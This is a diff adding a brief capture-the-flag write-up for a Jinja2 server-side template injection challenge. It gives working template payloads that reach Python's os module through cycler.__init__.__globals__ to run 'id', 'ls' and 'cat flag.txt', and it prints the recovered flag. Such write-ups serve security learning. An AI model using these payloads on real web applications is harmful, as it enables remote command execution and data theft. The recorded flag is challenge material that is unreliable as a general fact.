@@ -1,0 +1,11 @@
+1- launch directory listing
+2- found that all the pages returned 200
+3- checked different pages and found that they are all the same (changing the name of the page accessed)
+4- remembered it runs jinja2
+5- tried some SSTI (with {{config}} ) to check if it is vulnerable, it is, we got the config info
+6- tried to access <class object> with {{ dict.__base__ }} -> achieved
+7- tried to access os, running {{ cycler.__init__.__globals__.os.popen('id').read() }} to check if we have access -> we got it
+8- we run {{ cycler.__init__.__globals__.os.popen('ls').read() }} and returns:
+bin boot dev etc flag.txt home lib lib64 media mnt opt proc root run sbin srv sys tmp usr var
+ we see there is a flag.txt
+9- we run {{ cycler.__init__.__globals__.os.popen('cat flag.txt').read() }} and we got HTB{t3mpl4t3s_4r3_m0r3_p0w3rfu1_th4n_u_th1nk!}
